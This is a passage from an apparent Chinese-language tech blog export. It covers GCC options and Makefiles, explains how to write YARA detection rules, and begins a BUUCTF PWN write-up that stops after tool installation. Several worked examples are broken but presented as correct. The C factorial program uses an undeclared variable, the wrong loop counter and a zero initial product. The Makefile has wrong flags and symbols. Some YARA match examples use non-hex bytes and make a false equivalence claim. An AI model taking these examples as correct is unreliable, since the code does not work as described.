<li>链接：当所有目标文件都生成之后，GCC就调用ld来完成链接，在链接阶段，所有的目标文件被安排在可执行程序中的恰当位置，同时，程序中所调用的库函数也从各自所在的函数库中链接到合适的地方。<br><strong>需要注意的是，Linux系统中，不以后缀名作为文件区分的标志，但是GCC通过文件后缀名来区分文件。</strong></li>
</ul>
<h2 id="gcc参数"><a href="#gcc参数" class="headerlink" title="gcc参数"></a>gcc参数</h2><h4 id="o-输出文件名"><a href="#o-输出文件名" class="headerlink" title="-o 输出文件名"></a>-o 输出文件名</h4><p><code>gcc test.c -o test</code> 将gcc的处理结果输出到test文件中。本例中输出可执行文件。</p>
<h4 id="E-输出预处理文件"><a href="#E-输出预处理文件" class="headerlink" title="-E 输出预处理文件"></a>-E 输出预处理文件</h4><p><code>gcc -E test.c -o test.i</code> 将预处理输出到test.i文件中。在大型项目中，可能各个宏的值不容易从代码里面直接看出来，通过-E参数，可以全部展开。</p>
<h4 id="S-输出汇编文件"><a href="#S-输出汇编文件" class="headerlink" title="-S 输出汇编文件"></a>-S 输出汇编文件</h4><p><code>gcc -S test.i -o test.S</code> <code>gcc -S test.c -o test.S</code> 将预处理文件test.i，或者源代码文件<code>test.c</code>，转出汇编文件test.S。</p>
<h4 id="c-输出编译中间文件"><a href="#c-输出编译中间文件" class="headerlink" title="-c 输出编译中间文件"></a>-c 输出编译中间文件</h4><p><code>gcc -c test.S -o test.o</code> <code>gcc -c test.i -o test.o</code> <code>gcc -c test.c -o test.o</code> 将汇编文件<code>test.S</code>，或者预处理文件<code>test.i</code>，或者源代码文件<code>test.c</code>，编译成输出文件test.o；再将输出文件编译成可执行文件test。</p>
<h4 id="无参数-输出可执行文件"><a href="#无参数-输出可执行文件" class="headerlink" title="无参数 输出可执行文件"></a>无参数 输出可执行文件</h4><p><code>gcc test.c -o test</code> <code>gcc test.S -o test</code> <code>gcc test.i -o test</code> <code>gcc test.o -o test</code></p>
<h4 id="O"><a href="#O" class="headerlink" title="-O"></a>-O</h4><p><code>gcc -O1 test.c -o test</code> 使用优化级别1编译程序。级别1~3，越大优化越多，编译时间越长。也可以不带数字，默认是1。</p>
<h4 id="Dmacro"><a href="#Dmacro" class="headerlink" title="-Dmacro"></a>-Dmacro</h4><ol>
<li><code>gcc -DNO_FUNCTION test.c -o test</code> 相当于test.c中添加宏定义<code>#define NO_FUNCTION 1</code></li>
<li><code>gcc -DCPU_NUM=4 test.c -o test</code> 相当于test.c中添加宏定义<code>#define CPU_NUM 4</code></li>
<li><code>gcc -DCPU_NUM=&quot;4&quot; test.c -o test</code> 与上相同，相当于定义<code>#define CPU_NUM 4</code></li>
<li><code>gcc -DCPU_NUM=\&quot;4\&quot; test.c -o test</code> 定义一个字符串宏，相当于<code>#define CPU_NUM &quot;4&quot;</code></li>
</ol>
<h4 id="Wall"><a href="#Wall" class="headerlink" title="-Wall"></a>-Wall</h4><p>生成所有警告信息</p>
<h4 id="lxx-Lxx-Ixx"><a href="#lxx-Lxx-Ixx" class="headerlink" title="-lxx -Lxx -Ixx"></a>-lxx -Lxx -Ixx</h4><p><code>gcc test.c -lstr -L/path/lib -I/path/include -o test</code> 表示链接libstr.so库，库所在路径为&#x2F;path&#x2F;lib，头文件所在路径为&#x2F;path&#x2F;include</p>
<h4 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h4><p><code>gcc -g test.c -o test</code> 生成gbd的调试信息，可以通过<code>gdb test</code>跟踪调试</p>
<h1 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h1><h2 id="一-常用变量以及通配符："><a href="#一-常用变量以及通配符：" class="headerlink" title="一.常用变量以及通配符："></a>一.常用变量以及通配符：</h2><p>$@   目标文件<br>$^    所有依赖文件<br>$&lt;  表示第一个依赖文件     &#x2F;&#x2F;第一个依赖文件是.c文件。<br>$?  表示比目标还要新的依赖文件列表 </p>
<ul>
<li><strong>通配符符号：%</strong></li>
</ul>
<h2 id="二-使用举例："><a href="#二-使用举例：" class="headerlink" title="二.使用举例："></a>二.使用举例：</h2><p>假设某工程师需要计算6~10的阶乘之和，包含两个C语言源文件：a.c和al.c：<br>a.c：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="type">int</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span>)</span>; </span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123; </span><br><span class="line">	<span class="type">int</span> sum = <span class="number">0</span>; </span><br><span class="line">	<span class="keyword">for</span>(x=<span class="number">6</span>;x&lt;=<span class="number">10</span>;i++)&#123;</span><br><span class="line">		sum += factorial(x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;sum = %d\n&quot;</span>,sum); </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>al.c：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">factorial</span><span class="params">(<span class="type">int</span> h)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> k,s = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(k = <span class="number">1</span>; k &lt;= h;k++)&#123;</span><br><span class="line">        s*=k;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这时候我们就需要Makefile文件：</p>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="code"><pre><span class="line">CC = gcc <span class="comment">#设置变量CC的值为gcc，代表编译器</span></span><br><span class="line">FLAGS += -Wall <span class="comment">#该变量将作为编译器的参数</span></span><br><span class="line">EXEC = aa <span class="comment">#设置变量EXEC的值为aa，该变量代表要生成的可执行文件名</span></span><br><span class="line"></span><br><span class="line"><span class="section">all:$&#123;EXEC&#125; #规则语句块，目标名为all，依赖文件为变量EXEC的值</span></span><br><span class="line"></span><br><span class="line"><span class="section">$&#123;EXEC&#125;:a.o al.o #规则语句块，目标名为变量EXEC的值，依赖文件为a.o和al.o</span></span><br><span class="line">	$&#123;CC&#125; $&#123;FLAGS&#125; -c <span class="variable">$@</span> a.o al.o <span class="comment">#规则语句块的命令行，使用依赖文件生成目标，$@代表该规则语句块的目标</span></span><br><span class="line"></span><br><span class="line"><span class="section">a.o:a.c #规则语句块，目标名为发al.o，依赖文件为al.c</span></span><br><span class="line">	$&#123;CC&#125; $&#123;FLAGS&#125; -c @^ <span class="comment">#规则语句块的命令行，使用依赖文件a.c生成目标a.o,$^代表生成目标的依赖文件</span></span><br><span class="line"></span><br><span class="line"><span class="section">al.o:al.c #规则语句块，目标名为al.o，依赖文件名为al.c</span></span><br><span class="line">	$&#123;CC&#125; $&#123;FLAGS&#125; -c al.c <span class="comment">#规则语句块的命令行，使用依赖文件al.c生成目标al.o</span></span><br><span class="line"></span><br><span class="line"><span class="section">clean: #伪目标规则语句块，无依赖文件</span></span><br><span class="line">	rm -f $&#123;EXEC&#125; a.o al.o <span class="comment">#规则语句块的命令行，删除所有目标文件</span></span><br><span class="line"></span><br><span class="line">test： <span class="comment">#伪目标规则语句块，无依赖文件</span></span><br><span class="line">	./$&#123;EXEC&#125; <span class="comment">#规则语句块的命令行，运行变量EXEC所代表的最终目标文件</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>嵌入式系统应用</category>
      </categories>
      <tags>
        <tag>嵌入式系统应用</tag>
      </tags>
  </entry>
  <entry>
    <title>Yara（恶意样本检测工具）</title>
    <url>/2025/02/16/Yara%EF%BC%88%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%EF%BC%89/</url>
    <content><![CDATA[<p><a class="link"   href="https://virustotal.github.io/yara/" >Yara官网地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a><br><a class="link"   href="https://www.cnblogs.com/Hekeats-L/p/17902549.html" >本人学习地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="一-Yara简介："><a href="#一-Yara简介：" class="headerlink" title="一.Yara简介："></a>一.Yara简介：</h2><p>YARA是一个旨在(但不限于)帮助恶意软件研究人员识别和分类恶意软件样本的工具，使用YARA，你可以基于文本或二进制模式创建关于恶意软件家族的描述(或任何你想要描述的内容)。每个描述，也就是一个规则，由一组字符串和一个布尔表达式组成，这些字符串和布尔表达式决定了它的逻辑。<br>Yara可以基于二进制和文本模式识别信息，例如识别指定文件中所包含的字符串或者十六进制(hexadecimal)。<br>规则可以被用于标记模式，例如，编写Yara规则通常是为了根据文件所呈现的特性(或模式)来确定文件是否恶意。</p>
<h2 id="二-Yara规则简介："><a href="#二-Yara规则简介：" class="headerlink" title="二.Yara规则简介："></a>二.Yara规则简介：</h2><p>Yara用于编写规则的专有语言学习起来相当简单，但很难掌握，这是因为你编写的规则的有效性取决于你对你想要搜索模式的理解。<br>使用Yara规则很简单，每个yara命令需要两个参数才能有效，它们是：</p>
<ol>
<li>我们所创建的规则文件；</li>
<li>要使用规则的文件名称、目录或进程ID。<br>每条规则都必须有名称和条件，例如，如果我们想针对目录”somedirectory”来使用”myrule.yar”规则，我们将输入如下的命令：<br><code>yara myrule.yar somedirectory</code><br><strong>.yar是所有Yara规则的标准文件拓展名</strong></li>
</ol>
<h2 id="三-Yara规则编写："><a href="#三-Yara规则编写：" class="headerlink" title="三.Yara规则编写："></a>三.Yara规则编写：</h2><h3 id="1-规则标识符："><a href="#1-规则标识符：" class="headerlink" title="1.规则标识符："></a>1.规则标识符：</h3><p>每个关键字都以<code>rule</code>开头，后面跟着一个规则标识符。<strong>该标识符遵循的规则与C语言标识符定义规则一样，由英文字母，数字，下划线组成，大小写敏感，不能以数字开头</strong>。</p>
<h3 id="2-Meta："><a href="#2-Meta：" class="headerlink" title="2.Meta："></a>2.Meta：</h3><p>在Yara规则中，<code>meta</code>是用于提供关于规则本身的元信息的部分，而不是用于定义条件的部分。<code>meta</code>节包含有关规则的描述性信息，例如作者、版本、描述等。这些元信息不直接影响规则的匹配，而是提供有关Yara规则的额外信息和说明。<br>Yara规则的这一部分是为规则的作者所保留的描述性信息。例如，你可以使用desc，description(描述)的缩写，来总结规则检查的内容，这部分中的任何内容都不会影响规则本身，与注释代码类似，总结规则也很有用。<br><em>tips：在Yara规则中，desc关键字属于meta节的一部分。</em><br>在Meta中我们可以定义一些该规则的描述信息。</p>
<h3 id="3-strings："><a href="#3-strings：" class="headerlink" title="3.strings："></a>3.strings：</h3><h4 id="十六进制字符串："><a href="#十六进制字符串：" class="headerlink" title="&lt;1&gt;.十六进制字符串："></a>&lt;1&gt;.十六进制字符串：</h4><p><strong>？：通配符，可以代替某些未知字节，与任何内容匹配</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule WildcardExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">       <span class="comment">// 使用‘?’作为通配符</span></span><br><span class="line">       $hex_string = &#123; <span class="number">00</span> <span class="number">11</span> ?? <span class="number">33</span> <span class="number">4</span>? <span class="number">55</span> &#125;</span><br><span class="line">    condition:</span><br><span class="line">       $hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个规则可以匹配下面的两个字符串：<br>00 11 01 33 43 55<br>00 11 AA 33 4N 55</p>
<p><strong>跳转：可以匹配长度可变的字符串</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">       <span class="comment">// 使用‘[]’作为跳转，与任何长度为0-2字节的内容匹配</span></span><br><span class="line">       $hex_string1 = &#123; <span class="number">00</span> <span class="number">11</span> [<span class="number">2</span>] <span class="number">44</span> <span class="number">55</span> &#125;</span><br><span class="line">       $hex_string2 = &#123; <span class="number">00</span> <span class="number">11</span> [<span class="number">0</span>-<span class="number">2</span>] <span class="number">44</span> <span class="number">55</span> &#125;</span><br><span class="line">       <span class="comment">// 该写法与string1作用完全相同</span></span><br><span class="line">       $hex_string3 = &#123; <span class="number">00</span> <span class="number">11</span> ?? ?? <span class="number">44</span> <span class="number">55</span> &#125;</span><br><span class="line">    condition:</span><br><span class="line">       $hex_string1 and $hex_string2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个规则可以匹配下面的两个字符串：</p>
<p>00 11 01 22 44 55<br>00 11 AA 44 55</p>
<p><strong>匹配无限长的字符串</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule BuzzLightyear</span><br><span class="line">&#123;</span><br><span class="line">	strings:</span><br><span class="line">        $hex_string = &#123; F4 <span class="number">23</span> [-] <span class="number">62</span> B4 &#125;</span><br><span class="line">    condition:</span><br><span class="line">        $hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个规则可以匹配下面的两个字符串：</p>
<p>F4 23 AA FF 62 B4<br>F4 23 AA AA AA AA AA…FF FF 62 B4</p>
<p><strong>也可以使用类似于正则表达式的语法</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule AlternativesExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">       $hex_string = &#123; <span class="number">00</span> <span class="number">11</span> ( <span class="number">22</span> | <span class="number">33</span> <span class="number">44</span> ) <span class="number">55</span> &#125;</span><br><span class="line">    condition:</span><br><span class="line">       $hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以匹配以下内容:</p>
<p>00 11  22  55<br>00 11  33 44  55</p>
<p><strong>上述方法整合使用：</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">       $hex_string = &#123; <span class="number">00</span> <span class="number">11</span> ( <span class="number">33</span> <span class="number">44</span> | <span class="number">55</span> | <span class="number">66</span> ?? <span class="number">88</span> ) <span class="number">99</span> &#125;</span><br><span class="line">    condition:</span><br><span class="line">       $hex_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这个规则可以匹配下面的三个字符串：</p>
<p>00 11 33 44 99<br>00 11 55 99<br>00 11 66 AG 88 99</p>
<h4 id="文本字符串："><a href="#文本字符串：" class="headerlink" title="&lt;2&gt;.文本字符串："></a>&lt;2&gt;.文本字符串：</h4><blockquote>
<p>nocase：  不区分大小写<br>wide：      匹配2字节的宽字符， 这种宽字符串在许多二进制文件中都有出现<br>ascii：      匹配1字节的ascii字符<br>xor：        匹配异或后的字符串<br>fullword： 匹配完整单词，用于匹配那些前后没有附加其他字符的单词<br>private：  定义私有字符串</p>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule CaseInsensitiveTextExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        <span class="comment">// 不区分大小写</span></span><br><span class="line">        $text_string = <span class="string">&quot;foobar&quot;</span> nocase</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 匹配宽字符串</span></span><br><span class="line">        $wide_string = <span class="string">&quot;Borland&quot;</span> wide</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 同时匹配2种类型的字符串</span></span><br><span class="line">        $wide_and_ascii_string = <span class="string">&quot;Borland&quot;</span> wide ascii</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 匹配所有可能的异或后字符串</span></span><br><span class="line">        $xor_string = <span class="string">&quot;This program cannot&quot;</span> xor</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 匹配所有可能的异或后wide ascii字符串</span></span><br><span class="line">        $xor_string = <span class="string">&quot;This program cannot&quot;</span> xor wide ascii</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 限定异或范围</span></span><br><span class="line">        $xor_string = <span class="string">&quot;This program cannot&quot;</span> xor(<span class="number">0x01</span>-<span class="number">0xff</span>)</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 全词匹配(匹配:www.domain.com  匹配:www.my-domain.com  不匹配:www.mydomain.com)</span></span><br><span class="line">        $wide_string = <span class="string">&quot;domain&quot;</span> fullword</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// 私有字符串可以正常匹配规则，但是永远不会在输出中显示</span></span><br><span class="line">        $text_string = <span class="string">&quot;foobar&quot;</span> <span class="keyword">private</span></span><br><span class="line"> </span><br><span class="line">    condition:</span><br><span class="line">        $text_string</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="正则表达式："><a href="#正则表达式：" class="headerlink" title="&lt;3&gt;.正则表达式："></a>&lt;3&gt;.正则表达式：</h4><p>yara正则表达式与Perl编程中的正则表达式相差不大。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule RegularShow</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $re1 = /md5: [<span class="number">0</span>-9a-fA-F]&#123;<span class="number">32</span>&#125;/</span><br><span class="line">        $re2 = /state: (on|off)/</span><br><span class="line">    condition:</span><br><span class="line">        $re1 and $re2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h3 id="4-condition："><a href="#4-condition：" class="headerlink" title="4.condition："></a>4.condition：</h3><p><strong>#：</strong> 计算字符串在文件或内存中出现的次数：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule CountExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="comment">//a字符串出现6次，b字符串大于10次</span></span><br><span class="line">        #a == <span class="number">6</span> and #b &gt; <span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>**@：**使用<code>@a[i]</code>可以获取$a字符串在文件或者内存中第i次出现时的偏移或虚拟地址。<em>注意索引从1开始的，如果字符串出现次数小于i，则返回NaN</em><br>**!：**使用<code>!a[i]</code>可以获取字符串$a在文件或者内存中，第i次出现时的字符串长度。<em>下标从1开始，!a是!a[1]的简写</em>。</p>
<p><strong>at：</strong> 匹配字符串在文件或内存中的偏移</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule AtExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="comment">// a和b字符串出现在文件或内存的100和200偏移处</span></span><br><span class="line">        $a at <span class="number">100</span> and $b at <span class="number">200</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>in：</strong> 在文件的某个地址范围内匹配字符串</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule InExample</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        $a <span class="title function_">in</span> <span class="params">(<span class="number">0.</span><span class="number">.100</span>)</span> and $b <span class="title function_">in</span> <span class="params">(<span class="number">100.</span>.filesize)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>filesize：</strong> 获取文件大小</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">filesize</span><br><span class="line"><span class="comment">// 使用关键字匹配文件大小</span></span><br><span class="line">rule FileSizeExample</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">       <span class="comment">// filesize只在文件时才有用，对进程无效</span></span><br><span class="line">       <span class="comment">// KB MB后缀只能与十进制大小一起使用</span></span><br><span class="line">       filesize &gt; 200KB</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>entrypoint：</strong> 获取PE或ELF文件入口点：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 匹配PE或ELF文件入口点(高版本请使用PE模块的pe.entry_point代替)</span></span><br><span class="line">rule EntryPointExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123; E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> &#125;</span><br><span class="line">    condition:</span><br><span class="line">       $a at entrypoint</span><br><span class="line">&#125;</span><br><span class="line">rule EntryPointExample2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = &#123; 9C <span class="number">50</span> <span class="number">66</span> A1 ?? ?? ?? <span class="number">00</span> <span class="number">66</span> A9 ?? ?? <span class="number">58</span> <span class="number">0F</span> <span class="number">85</span> &#125;</span><br><span class="line">    condition:</span><br><span class="line">       $a <span class="title function_">in</span> <span class="params">(entrypoint..entrypoint + <span class="number">10</span>)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>of：</strong> 匹配多个字符串中的某几个</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule OfExample1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">        $b = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">        $c = <span class="string">&quot;dummy3&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        <span class="comment">// 3个字符串只需匹配任意2个</span></span><br><span class="line">        <span class="number">2</span> of ($a,$b,$c)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>for xxx of xxx : (xxx)：</strong> 对多个字符串匹配相同的条件</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">格式：<span class="keyword">for</span> AAA of BBB : ( CCC )</span><br><span class="line">含义：</span><br><span class="line">在BBB字符串集合中，至少有AAA个字符串，满足了CCC的条件表达式，才算匹配成功。</span><br><span class="line">在CCC条件表达式中，可以使用<span class="string">&#x27;$&#x27;</span>依次代替BBB字符串集合中的每一个字符串。</span><br><span class="line"><span class="comment">// for..of其实就是of的特别版，所以下面2个例子作用相同</span></span><br><span class="line">any <span class="title function_">of</span> <span class="params">($a,$b,$c)</span></span><br><span class="line"><span class="keyword">for</span> any <span class="title function_">of</span> <span class="params">($a,$b,$c)</span> : ( $ )</span><br><span class="line"><span class="comment">// 在abc这3个字符串集合中，至少有1个字符串，必须满足字符串内容与entrypoint相同的条件。$表示集合中的所有字符串. 本例中, 它是字符串$a, $b和$c.</span></span><br><span class="line"><span class="keyword">for</span> <span class="number">1</span> of ($a,$b,$c) : ( $ at entrypoint  )</span><br><span class="line"><span class="keyword">for</span> any <span class="title function_">of</span> <span class="params">($a,$b,$c)</span> : ( $ at entrypoint  )</span><br><span class="line"><span class="comment">// 所有字符串，在文件或内存中出现的次数必须大于3，才算匹配成功。</span></span><br><span class="line"><span class="keyword">for</span> all of them : ( # &gt; <span class="number">3</span> )</span><br><span class="line"><span class="comment">// 所有以$a开头的字符串，在文件或内存中第2次出现的位置必须小于9</span></span><br><span class="line"><span class="keyword">for</span> all <span class="title function_">of</span> <span class="params">($a*)</span> : (@[<span class="number">2</span>] &lt; <span class="number">0x9</span>)</span><br></pre></td></tr></table></figure></div>
<p><strong>引用其他规则：</strong> </p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule Rule1</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy1&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        $a</span><br><span class="line">&#125;</span><br><span class="line">rule Rule2</span><br><span class="line">&#123;</span><br><span class="line">    strings:</span><br><span class="line">        $a = <span class="string">&quot;dummy2&quot;</span></span><br><span class="line">    condition:</span><br><span class="line">        $a and Rule1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>全局规则：</strong></p>
<p>全局规则可以在匹配目标文件之前，优先筛选</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">**global** rule SizeLimit</span><br><span class="line">&#123;</span><br><span class="line">    condition:</span><br><span class="line">        filesize &lt; 2MB</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>私有规则：</strong></p>
<p>私有规则（private rule）可以避免规则匹配结果的混乱，</p>
<p>比如使用私有规则进行匹配时，YARA不会输出任何匹配到的私有规则信息</p>
<p>私有规则单独使用意义不大，一般可以配合”引用其它规则”的功能一起使用。比如为了判断文件是否恶意, 有这样一条私有规则, 要求文件必须是ELF文件. 一旦满足这个要求, 随后就会执行下一条规则. 但我们在输出里想看的并不是该文件它是不是ELF, 我们只想知道文件是否恶意, 那么私有规则就派上用场了.</p>
<p>私有规则也可以和全局规则一起使用，只要添加“Private”、“global”关键字即可</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> rule PrivateRuleExample</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>规则标签：</strong></p>
<p>规则标签可以让你在yara输出的时候，只显示你感兴趣的规则，而过滤掉其他规则的输出信息：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">rule TagsExample1 : Foo Bar Baz</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line">rule TagsExample2 : Bar</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><strong>导入模块：</strong></p>
<p>导入模块之后，可以使用导出的变量或者函数</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">&quot;pe&quot;</span></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;cuckoo&quot;</span></span><br><span class="line">pe.entry\_point == <span class="number">0x1000</span></span><br><span class="line">cuckoo.http\_request(/someregexp/)</span><br></pre></td></tr></table></figure></div>
<p><strong>文件包含：</strong></p>
<p>可以将其他规则包含到当前文件中</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 作用于C语言一样，可以包含其它规则到当前文件中</span></span><br><span class="line">include <span class="string">&quot;other.yar&quot;</span></span><br><span class="line"><span class="comment">// 相对路径</span></span><br><span class="line">include <span class="string">&quot;./includes/other.yar&quot;</span></span><br><span class="line">include <span class="string">&quot;../includes/other.yar&quot;</span></span><br><span class="line"><span class="comment">// 全路径</span></span><br><span class="line">include <span class="string">&quot;/home/plusvic/yara/includes/other.yar&quot;</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Tools</tag>
        <tag>yara</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF刷题记录（RE,PWN)---附带PWN环境搭建</title>
    <url>/2024/03/23/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%88RE,PWN)---%E9%99%84%E5%B8%A6PWN%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<p>这里题目全部都是<a class="link"   href="https://buuoj.cn/challenges" >BUUCTF<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>Reverse和PWN第一页的题目。</p>
<h1 id="PWN环境搭建"><a href="#PWN环境搭建" class="headerlink" title="PWN环境搭建"></a>PWN环境搭建</h1><h2 id="1-fish"><a href="#1-fish" class="headerlink" title="1.fish"></a>1.fish</h2><p>个人喜欢使用fish<br><code>sudo apt install fish</code><br>设置为默认shell：<code>chsh -s /usr/bin/fish</code></p>
<h2 id="2-pwntools"><a href="#2-pwntools" class="headerlink" title="2.pwntools"></a>2.pwntools</h2><p>临时换源安装：<code>sudo pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple</code></p>
<h2 id="3-pwndbg"><a href="#3-pwndbg" class="headerlink" title="3.pwndbg"></a>3.pwndbg</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/pwndbg/pwndbg</span></span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure></div>
<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="buuctf-rip"><a href="#buuctf-rip" class="headerlink" title="buuctf-rip"></a>buuctf-rip</h2><h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>DIE查看文件静态信息：<br><img  
                     lazyload
                     src="/images/loading.svg"
